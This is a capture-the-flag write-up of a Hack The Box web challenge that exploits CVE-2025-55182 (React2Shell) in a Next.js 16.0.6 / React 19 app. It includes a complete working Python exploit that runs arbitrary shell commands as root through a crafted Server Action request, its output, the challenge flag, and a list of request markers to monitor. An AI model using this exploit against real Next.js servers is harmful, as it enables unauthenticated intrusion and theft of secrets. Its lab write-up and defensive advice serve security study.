# HTB Web Challenge Writeup: ReactOOPS / NexusAI

> **Category:** Web Exploitation  
> **Platform:** Hack The Box Labs  
> **Difficulty Style:** Framework Vulnerability / RCE  
> **Vulnerability:** React Server Components Remote Code Execution  
> **CVE:** CVE-2025-55182  
> **Impact:** Unauthenticated Remote Code Execution  
> **Flag:** `HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}`

---

## 1. Challenge Scenario

The challenge introduces a polished AI assistant platform named **NexusAI**.

> NexusAI's polished assistant interface promises adaptive learning and seamless interaction. But beneath its reactive front end, subtle glitches hint that user input may be shaping the system in unexpected ways. Explore the platform, trace the echoes in its reactive layer, and uncover the hidden flaw buried behind the UI.

At first glance, the application looks like a simple landing page for a personal AI assistant. There are marketing sections, buttons such as **Get Started**, **Start Free Trial**, and **Watch Demo**, but no obvious login form, upload feature, or traditional input field.

The important hint from the scenario is:

```text
reactive front end
reactive layer
user input may be shaping the system
```

This strongly suggests that the issue may not be in normal application logic, but in the **React / Next.js rendering layer**.

---

## 2. Initial Target Check

After starting the HTB instance, the target was available at:

```bash
http://154.57.164.76:31532
```

I first checked whether the target was alive:

```bash
export TARGET="http://154.57.164.76:31532"
curl -sS -D - -o /dev/null "$TARGET/" | head
```

The response:

```http
HTTP/1.1 200 OK
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
X-Powered-By: Next.js
Content-Type: text/html; charset=utf-8
```

### Why this step matters

Before exploiting anything, we must confirm three things:

1. The target is reachable.
2. The technology stack matches our hypothesis.
3. The application exposes behavior related to React Server Components.

The most important headers are:

```http
X-Powered-By: Next.js
Vary: rsc, next-router-state-tree, ...
```

`X-Powered-By: Next.js` confirms that the application uses Next.js.

`Vary: rsc` indicates the presence of **React Server Components** behavior. This is very important because the challenge hints at a flaw in the reactive layer.

---

## 3. Frontend Inspection

Using browser DevTools, the page source showed assets such as:

```html
/_next/static/chunks/...
/_next/static/chunks/turbopack-...
```

It also contained React Flight data similar to:

```javascript
self.__next_f.push(...)
```

### What this means

This confirms the application is not a classic static HTML site. It is a modern **Next.js App Router** application using React internals.

At this point, I avoided wasting too much time on the visible buttons because they did not appear to trigger meaningful business logic.

The UI was most likely a decoy.

---

## 4. Source Code Review

The challenge also provided a ZIP file protected with the password:

```text
hackthebox
```

After extracting the ZIP:

```bash
unzip -P hackthebox ReactOOPS.zip
cd web_reactoops/challenge
```

I listed the files:

```bash
find . -maxdepth 3 -type f | sort
```

Important files included:

```text
app/page.tsx
app/layout.tsx
package.json
next.config.mjs
flag.txt
Dockerfile
```

---

## 5. Reviewing `package.json`

The most important discovery was inside `package.json`:

```json
{
  "name": "react2shell",
  "dependencies": {
    "next": "16.0.6",
    "react": "^19",
    "react-dom": "^19"
  }
}
```

### Why this is important

The project name itself is a huge hint:

```text
react2shell
```

This suggests a vulnerability that turns React behavior into shell command execution.

The dependency versions are also suspicious:

```text
Next.js 16.0.6
React 19
React DOM 19
```

This combination points to a known React Server Components vulnerability:

```text
CVE-2025-55182
```

The vulnerability is commonly referred to as **React2Shell**.

---

## 6. Reviewing the Dockerfile

Next, I checked the Dockerfile because CTF challenges often reveal where the flag is stored.

The important part:

```dockerfile
COPY challenge/flag.txt /app/flag.txt
```

This tells us that the flag on the running server should be located at:

```bash
/app/flag.txt
```

### Why this step matters

Instead of blindly searching the filesystem, we use the deployment configuration to determine the exact flag path.

This is cleaner, faster, and more professional.

The goal becomes:

```bash
cat /app/flag.txt
```

But to run that command, we first need Remote Code Execution.

---

## 7. Vulnerability Hypothesis

At this point, the evidence was:

| Evidence | Meaning |
|---|---|
| `X-Powered-By: Next.js` | Target uses Next.js |
| `Vary: rsc` | React Server Components behavior is present |
| `self.__next_f.push(...)` | React Flight stream detected |
| Project name: `react2shell` | Hint toward React RCE |
| Next.js `16.0.6` | Vulnerable version range |
| Flag path in Dockerfile | Target file is `/app/flag.txt` |

So the likely vulnerability was:

```text
Unauthenticated Remote Code Execution through React Server Components / Server Action processing
```

In simple terms:

> The server accepts special React internal data from the client. Because of a framework-level bug, a maliciously crafted request can cause the server to execute JavaScript/Node.js code.

---

## 8. Why Not Test SQLi, XSS, or JWT First?

The application did not expose traditional attack surfaces:

- No login page
- No search feature
- No obvious API endpoint
- No file upload
- No JWT-based authentication
- No visible user-controlled input

The challenge hints and source code pointed directly toward a framework-level issue.

Therefore, the correct path was not:

```text
Try random payloads in the UI
```

The correct path was:

```text
Analyze framework version
Confirm RSC behavior
Trigger the vulnerable React/Next.js internal processing path
Obtain RCE
Read /app/flag.txt
```

---

## 9. Preparing the Python Environment

Initially, installing Python packages globally failed because the system was externally managed:

```text
error: externally-managed-environment
```

This is common on modern Debian/Kali systems.

To avoid breaking the system Python environment, I created a virtual environment:

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
pip install requests
```

### Why use a virtual environment?

A virtual environment is like a separate toolbox for one project.

Instead of installing packages globally and potentially damaging the system Python setup, we install them only inside the current project folder.

In this case, the final script used Python standard libraries, so `requests` was not strictly required. However, setting up a virtual environment is still a good habit for CTF and security research work.

---

## 10. Exploit Script

The exploit script was saved as:

```bash
react2shell_nopip.py
```

The script:

```python
#!/usr/bin/env python3
import sys
import json
import urllib.request
import urllib.error

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <target_url> <command>")
    sys.exit(1)

target = sys.argv[1].rstrip("/") + "/"
cmd = sys.argv[2]

# The payload executes a system command using Node.js child_process.
# The output is placed into the React error digest so we can read it from the response.
js = (
    "var res = process.mainModule.require('child_process')"
    f".execSync({cmd!r}, {{timeout: 5000}}).toString();"
    "throw Object.assign(new Error('NEXT_REDIRECT'), {digest: res});"
    "//"
)

payload = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\"then\":\"$B1337\"}",
    "_response": {
        "_prefix": js,
        "_formData": {
            "get": "$1:constructor:constructor"
        }
    }
}

boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

def field(name, value):
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
        f"{value}\r\n"
    ).encode()

body = b"".join([
    field("0", json.dumps(payload, separators=(",", ":"))),
    field("1", "\"$@0\""),
    f"--{boundary}--\r\n".encode(),
])

req = urllib.request.Request(
    target,
    data=body,
    method="POST",
    headers={
        "User-Agent": "Mozilla/5.0",
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    },
)

try:
    with urllib.request.urlopen(req, timeout=15) as resp:
        print(f"[status] {resp.status}")
        print("[headers]")
        for k, v in resp.headers.items():
            if k.lower() in ["x-action-redirect", "location", "content-type"]:
                print(f"{k}: {v}")
        print("[body]")
        print(resp.read().decode("utf-8", "replace")[:5000])

except urllib.error.HTTPError as e:
    print(f"[status] {e.code}")
    print("[headers]")
    for k, v in e.headers.items():
        if k.lower() in ["x-action-redirect", "location", "content-type"]:
            print(f"{k}: {v}")
    print("[body]")
    print(e.read().decode("utf-8", "replace")[:5000])
```

Make the script executable:

```bash
chmod +x react2shell_nopip.py
```

---

## 11. Exploit Script Explanation

### 11.1 Target and command input

```python
target = sys.argv[1].rstrip("/") + "/"
cmd = sys.argv[2]
```

The script takes two arguments:

```bash
python3 react2shell_nopip.py <target_url> <command>
```

Example:

```bash
python3 react2shell_nopip.py "$TARGET" "id"
```

This means:

```text
Send the exploit to the target and ask the server to execute the command: id
```

---

### 11.2 JavaScript command execution payload

```python
js = (
    "var res = process.mainModule.require('child_process')"
    f".execSync({cmd!r}, {{timeout: 5000}}).toString();"
    "throw Object.assign(new Error('NEXT_REDIRECT'), {digest: res});"
    "//"
)
```

This creates JavaScript code that runs on the vulnerable Node.js server.

The important part:

```javascript
process.mainModule.require('child_process').execSync("id")
```

`child_process` is a Node.js module that can execute operating system commands.

So if the command is:

```bash
id
```

The server runs:

```bash
id
```

If the command is:

```bash
cat /app/flag.txt
```

The server runs:

```bash
cat /app/flag.txt
```

---

### 11.3 Why throw an error?

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {digest: res});
```

This is a trick to return the command output to us.

The command output is stored in:

```javascript
res
```

Then the script forces an error and places the output inside the error's `digest`.

That is why the server responds with HTTP status `500`.

In this exploit, `500 Internal Server Error` is not failure. It is expected behavior.

The error becomes a container for the command output.

---

### 11.4 Malicious React payload structure

```python
payload = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\"then\":\"$B1337\"}",
    "_response": {
        "_prefix": js,
        "_formData": {
            "get": "$1:constructor:constructor"
        }
    }
}
```

This structure abuses the way React processes internal serialized data.

The payload uses fields such as:

```text
then
__proto__
constructor
_response
_prefix
_formData
```

The goal is to reach an unsafe internal processing path where our JavaScript payload is evaluated.

In simple words:

> We send data that looks like internal React data, but it is shaped in a malicious way so the server accidentally executes our code.

---

### 11.5 Multipart form-data body

```python
boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
```

The exploit is sent as `multipart/form-data`.

This matters because Next.js Server Actions often process form-like requests.

The script builds form fields manually:

```python
body = b"".join([
    field("0", json.dumps(payload, separators=(",", ":"))),
    field("1", "\"$@0\""),
    f"--{boundary}--\r\n".encode(),
])
```

Field `0` contains the malicious payload.

Field `1` references field `0`.

Think of it like this:

```text
Envelope 0 contains the dangerous instruction.
Envelope 1 tells React to process Envelope 0.
```

---

### 11.6 The `Next-Action` header

```python
"Next-Action": "x",
```

This header tells Next.js to process the request through a special internal path related to Server Actions.

Without this header, the server may treat the request like a normal web request.

With this header, the request is routed into the interesting React/Next.js processing layer.

---

## 12. Testing RCE with `id`

Before reading the flag, I tested whether command execution worked:

```bash
python3 react2shell_nopip.py "$TARGET" "id"
```

The result:

```text
[status] 500
[headers]
Content-Type: text/x-component
[body]
0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
1:E{"digest":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n"}
```

### Why use `id` first?

The `id` command is a safe and simple way to confirm RCE.

It answers:

```text
Did the command execute?
Which user executed it?
Can we see the output?
```

The output confirmed:

```text
uid=0(root)
```

This means the command was executed as root inside the container.

---

## 13. Reading the Flag

After confirming RCE, I read the flag:

```bash
python3 react2shell_nopip.py "$TARGET" "cat /app/flag.txt"
```

The response:

```text
[status] 500
[headers]
Content-Type: text/x-component
[body]
0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
1:E{"digest":"HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}\n"}
```

Final flag:

```text
HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}
```

---

## 14. Understanding the `500` Response

The exploit returned:

```text
[status] 500
```

Normally, `500` means the server crashed or encountered an internal error.

In this exploit, the `500` is expected because the payload intentionally throws an error:

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {digest: res});
```

The command output is stored inside:

```text
digest
```

So this response is successful from an exploitation perspective.

---

## 15. Analogy: The Restaurant and the Kitchen

Imagine the website is a restaurant.

The normal website UI is the dining area:

```text
Nice design
Buttons
Marketing text
Friendly interface
```

But the React Server Components layer is like the restaurant kitchen.

Normal visitors should never control the kitchen.

However, due to the vulnerability, we can send a fake internal kitchen order:

```text
Please run this kitchen machine command:
cat /app/flag.txt
```

The kitchen accepts the fake order because the internal validation is broken.

Then we force the kitchen to throw an error message that includes the result of our command.

That is how the flag comes back to us.

---

## 16. Attack Flow Summary

```text
Start target
↓
Check HTTP headers
↓
Confirm Next.js and RSC behavior
↓
Inspect provided source code
↓
Find vulnerable Next.js/React versions
↓
Read Dockerfile to locate flag path
↓
Build malicious React Server Components payload
↓
Send POST request with Next-Action header
↓
Trigger command execution through Node.js child_process
↓
Confirm RCE with id
↓
Read /app/flag.txt
↓
Capture flag
```

---

## 17. Security Impact

This vulnerability is critical because it allows:

```text
Unauthenticated Remote Code Execution
```

That means an attacker does not need:

- A valid account
- A password
- A session token
- User interaction
- Admin access

With only network access to the vulnerable application, an attacker may be able to execute commands on the server.

Potential real-world impact:

- Read sensitive files
- Dump environment variables
- Steal secrets and API keys
- Access source code
- Modify application files
- Create backdoors
- Pivot to internal systems
- Compromise cloud credentials

---

## 18. Defensive Recommendations

### 18.1 Patch vulnerable dependencies

Upgrade Next.js and React to patched versions.

For this challenge, the application used:

```json
"next": "16.0.6"
```

A patched version for this line would be:

```bash
npm install next@16.0.7
```

Also update React and React DOM to patched versions recommended by the official advisory.

---

### 18.2 Do not run containers as root

The command `id` showed:

```text
uid=0(root)
```

Running the application as root increases impact.

A better Dockerfile should create a non-root user and run the app as that user.

Example:

```dockerfile
RUN addgroup --system nodejs && adduser --system nextjs
USER nextjs
```

---

### 18.3 Monitor suspicious requests

Defenders should monitor for suspicious requests containing:

```text
Next-Action
multipart/form-data
text/x-component
__proto__
constructor
_response
_prefix
```

These may indicate exploitation attempts against React/Next.js internals.

---

### 18.4 Rotate secrets after compromise

If a vulnerable application was exposed publicly, assume secrets may have been accessed.

Rotate:

- API keys
- Database credentials
- JWT secrets
- Cloud credentials
- Deployment tokens
- Webhook secrets

---

## 19. Lessons Learned

This challenge teaches several important lessons:

### 19.1 A clean UI does not mean a safe application

The visible NexusAI page looked harmless.

But the vulnerability was hidden in the framework layer.

---

### 19.2 Always check dependency versions

The source code did not contain an obvious `eval()` or unsafe function.

The real issue came from vulnerable framework versions.

Dependency analysis is a key part of web security.

---

### 19.3 Read deployment files

The Dockerfile revealed the exact location of the flag:

```bash
/app/flag.txt
```

In real-world assessments, Dockerfiles can reveal:

- Runtime paths
- Exposed ports
- Secrets handling mistakes
- Privilege level
- Build process
- File locations

---

### 19.4 Confirm exploit primitives step by step

Instead of immediately reading the flag, I first ran:

```bash
id
```

This confirmed:

```text
RCE works
Output is visible
The process runs as root
```

Then I safely proceeded to:

```bash
cat /app/flag.txt
```

This is a clean exploitation workflow.

---

## 20. Final Result

The challenge was solved by exploiting a vulnerable React/Next.js Server Components layer and reading the flag from the server filesystem.

Final flag:

```text
HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}
```

---

## 21. Key Takeaway

The main lesson:

> Modern web security is not only about testing forms and endpoints. Sometimes the most dangerous bug lives inside the framework that renders the page.

In this challenge, the visible website was only the surface.

The real vulnerability was buried in the React/Next.js server-side rendering and component processing layer.

That is why the correct path was:

```text
Framework fingerprinting
→ Dependency analysis
→ React Server Components exploit
→ Remote Code Execution
→ Read flag
```
